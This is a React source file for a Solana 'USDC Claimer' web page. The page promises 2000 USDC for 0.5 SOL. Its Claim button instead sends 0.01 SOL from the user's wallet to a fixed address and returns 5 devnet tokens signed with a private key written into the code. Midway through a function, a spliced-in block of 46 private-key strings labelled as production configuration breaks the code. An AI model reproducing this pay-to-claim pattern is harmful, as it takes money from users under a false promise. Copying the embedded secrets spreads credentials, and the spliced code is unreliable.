/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "46hDCiFkjg8EMd4yZHjVKsRVvmCAJLiz7QfJ4HUoN2j6uL1rp4iBBcVP859iV4unrabvTFV8QG1gpNqrogXen5Ay"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "2e5o5UdPjru65QEeu2T3MhNEDE7va9cKDiCPMxesysuXdHGqxpz4wnB69aJgkvxgUamoxiUkR3aoH68zy1n3VPJ8",
  "key1": "28h1Gs6CVWzLdcFNRWd2D3qjNPW5P9ynQtjr3Nbpb8uNWYi34SYeRRATqLUQ2Afj6pvL8DiCSvE2fUxFnHWr1UPh",
  "key2": "3Yieo1oCmZEd27rFjvYkqp66upeR18Vkh9C3SHUTaC4zAXnrF4ovML2KbYZUDPi1dcbe3wE5tD1JnfTJDJDrZDEy",
  "key3": "3ggMtCVC5DeEigL99iy2vBZm9nuEkyGwc1Yae6KHQwscnMqHMaDxUbPWY1z5C7w7JSpnheLumT9ZeZJ3mQQ6WH9m",
  "key4": "x12mpXVwQkepQ7LAvYzmRxrfRT3oYEgsZ92Rxi9R7VsNCPvCfbD5kNPxVJVw8uEts73iTWh3GxH1TB835GAqo2S",
  "key5": "4j1S2cfP7ZLFbB14PbEAD8ZC54mhDrPgUTrULUA6qydrxtWSeCNQLnkYrLCNvNV5VYo5MPV5oJKvgd82NuYk4dif",
  "key6": "2zn6rGWNDsGLogcbHjA3DLongyPWc3FFqKfYJcMd2MMygusAJLto9qGa2qfirxqWp3BfjeBpaq4CvdaVriNsyTow",
  "key7": "3FKz18GWHYZyVaKBSRLsuGdV8tErnL1B5QbS8DoFeAJkCPr1NxVwsAMWDCvVgMQycVX1FtGG8CHUtkj2LHaqmoer",
  "key8": "UnAHMLcHYvqc2baywfAsn8a9YvyhsuKSr1PDjCJtmawEBevM3FkRhGejgmeBCKsgpeQYE3qkqV6jUc7VmNdZrZ8",
  "key9": "3inLKKeqwokhg8GjXkvdqH3RxZnY9xTEGA4grEAXBWzjgUF3Cir5rC93R2edr3PDJWvFvnXdyqhza9bLHDQop31F",
  "key10": "3C4CKXf21MXnaWoHx3wzN9snMgVNHxaCQsK24r1hama8Fpa8nueotJ7pWH6W42hUxmj7fJ2mhCEUnmh3WGetP8RX",
  "key11": "4as2Lf32Ygc35wzhhKvCjQeMNrYRS7tLcwi51FpcQipSQ1NJk8YeqfMH37KW7mCAtTyqptdLgDokbyEuewu4QLeB",
  "key12": "39uy4Z65emM6QZoJgx6j1oHMMvwM8WTR1JZCVM3hCCnimcTi4xN74U1X3b2MChouqmEKi7fR9ffF1FDwMuDUs6Kz",
  "key13": "5h6yH6VtFrZNcS5tUvm4fmXFpJUZrbzAcurA4e9Y6GQrVaHzVCpXdGKeUtU66gyw3GYhYoP256Ske9svfSeNPaib",
  "key14": "2Qd8cgU1ENa7nym5kgWcB7MjBi98nSDhUQouyzR4pXj2YP7ssDgSfgPU9xbZT6bHFtdjXciA2aoEKZDFmsiA4isv",
  "key15": "34thbhNGSsRkrvWKkEddsA3CVAiDgxr9Y3h3bAA71gV7SY2v9Xb1WL1CWxyDqJ9pU2hC6MT3qhnmfhAhLT5GV5x4",
  "key16": "m8L8LQWXUb3hQwqSiJEsDQWc5d8bGaDAUKH7diYdoRtng5heQ5E4UDinK6wf5kGpVVAwrNFKNiWNQtxEe65sgTf",
  "key17": "49vFuom3L6SsM5Mrr9ZdnxzMKAKwHhrCkr9F32rj3KKbaDiNMC4febESQVrkuopE4YjrtRQ4SbbGN29j7eES4AuH",
  "key18": "2e5mhQDBbZ51oXWoGQDFCUojA2r48JN6FZ52xKRj3QrVWmNAVpXCVVeykSvTHsjgJm3sHi42u8ksD9DzLLtgfVfs",
  "key19": "2ZbQknbfpramwFh7P87bVfx8DHXyTMD83tgXbkBkiVAHa68gsoCfaMgNyDAfCB4UMzbL1hpZusysaWsNEs45x7Nc",
  "key20": "3kyenESG968tDQ6uajaGytehTpUvDDcpudpP6MNzUHngQWzrF9S3uQp4fEpmkYLWVs4SCBvsf8Msd8U7WmmJRoGz",
  "key21": "3uq9TL383iqwphPjRCEvqTt1KwSBwugQqZsQ7JFvMK6BKamYXvEY7RLKxQyuqJ2Yiu8cfkDC9zE6M1HFe5Mhnd47",
  "key22": "mDVvJqNxrJX5EqfyR2yKmGDxtFBruGVnfprKHT7YqZYqK3NYdSwDA5k2iwL8bvguV8FjYp1sy9skaguRNUxcTTt",
  "key23": "22KGgjyhdygVr8YYuM4ZqxqwQHXy57whuKSPN3cJVdwtVpUX8UaQZJvHLtBrM91WxK1QySMBQuFfpUUMrzWKX3Ry",
  "key24": "4KV2bL4ycoTcE34ESYj7eUmhzqr9yQ9ricRDxdHQ5kaLoJ8hUEN554Z4MAKZ9DP7o8rcYbYJ8Yz23EcTEZiF34wh",
  "key25": "53p8EScumfzNBDQF1WbES39gsfzKZ59JqV6d3wCarVGd4Vct8aXN7QLqRweYHbw7xdyyvPmaxkQwgW7d6FY4Nz7W",
  "key26": "3rbC6yHe4pKu9Rx6bHuKDBKUSDzLttFfCY4jz9ufnjDafer5ED6BWT1jN6XbrngfW8iXKzbVt5T3tfeYLqUGk9Zb",
  "key27": "5J3boDT3AJyYMsXYDD5ybFtFFiiWzrqdwayGLf6dCJYQ2FFMasjsxUuYS4EmEXXwktspMWJk6xFENpXEa6LoWnnr",
  "key28": "MaZfhWx7Y4atW5Fy9EDXBpwPAykttfTg3HTXH1b6VJvszPBCpcnc3VaK4P7vm5JMLfGyvoXk8kUPq4vDBVJLbcc",
  "key29": "3BmsaXe95o4ME25NsNWDQcM5hi6qxAx26jdZjBVzaLZBCgNFF9HwpinJrWSLWANk3Z6S9oXhAGor7Y7TQtQwVDh1",
  "key30": "fWioo8pEkGqfSzvAfx9LELc6EmyZrSk6cT3dh3yXCwj8rNkSyGZ4ZetGVLLocUSivnp5AyW9wYxzsUuLUAauM7x",
  "key31": "3w3vMH5x2nRF34R1YLhRH174Z6yD23tyky1cVVFkfnNavKtbz26YiMz4ApyhAJJZeMxsgaLfnKXG4METP4bfHJTv",
  "key32": "44x4yNxSa4o1gRDqQPfjhWNh6kPXgjmu22j8AMwfWgAYwYRD5pbpMbUmqVjdKLVNNwZeKW9f79kVRe2gH1d7fnxN",
  "key33": "46tbbXpZVHuTi8hgJdmvxEeKPpjm5qZFTotYiHC3V2kec9ton2U4MHcDpQphJh1fGSLkafmQ5Eh8GatCdGAjLTrn",
  "key34": "4aVijRSPZTPPeMEgPQjC4bNZj3wHHxNv7VDXRtFxooqsr8ZmaiHLeGvgA9kcE5mxsvLWgpfiWFnoatLtvYtvdMXX",
  "key35": "4S2iFuLgfkhF9wUAbMxyprMzE3v7nBQtJ4FHEJTnoiGW9d5GiiqtLmAwvX58RnkTPdAqhfTX1atoqLjEzmsRb2ns",
  "key36": "41XghDC4eyKnt1eJwmpgGb2FDQwax3CE3x1AC2w4XnyCDecsqWj1A159WkF4fDMEyoD3TQQGAZCjpQbFC1aG2nC",
  "key37": "3rH4juQxNf2mtkwxd4jZ9kGMZBGPAnBr7jzEQZxHq6WmV2mbDJz4zuA8q5SE9S2k7duKz58qqtFoaEJWoT1o4XhA",
  "key38": "cLfRE3ZJDCx2J22DCthZaXSNNJT1gvBuj4BigkX29KbrAbk4NP2rWPLpCZDzMQNXbwrUUPXJC7HWWTTZA7k2zpz",
  "key39": "2pFRPrxSri6bUgCybbiqTcrf9tJxdd3bQBXru5kQu5mAka6oLZ7D68y15jTJELj6QmKX1voDDBhwxUQFCAXmKhLd",
  "key40": "xHuPiczRjZ93eWp6n4d9REJqdE6zriP3nNCPK6j518eurZ9f2R7f1YZUR2vcFE8VpHcESsN4HPLiJu4abydZ27s",
  "key41": "4Jd1S6Pi5S17UkDxXResvUePW99WFig1u6PVxkwydQJjCEKtx8zjNXpqATqvbhfb1uMKxaQWWJBZT6HhnQq5GKin",
  "key42": "4rdx1Qe6dqMeRv9mGhwVsvy7CkhGj5znXjyeDvhp347DwaYNSkx1CbbMqvjxUZaNcACFA89KRkuQi7fNKzmY8Bm8",
  "key43": "2biKoBo6NrZsRVBGBgwSWLFGz2D3iwEsnua9mbP7T1w5LguNSTxNEmE6WxEnYQruVHJticNrt38qjo21aUbZ8Cqn",
  "key44": "3L8t3Kxq1zrx8EM38SHPKrxzKQeD4781J6MDfamFJMaxrQJwPcFxo9jWULTzFHQncMLsawvMsmvani6J6V3Wu1id",
  "key45": "Yu31fBkBnFr4dNyGEnP9ADozoYrDzg7p5UqzrzVDMvoz7ma6RsiyS1BgNsoEjDStnY1q3R3k61pxdem5LQ5A2rw"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
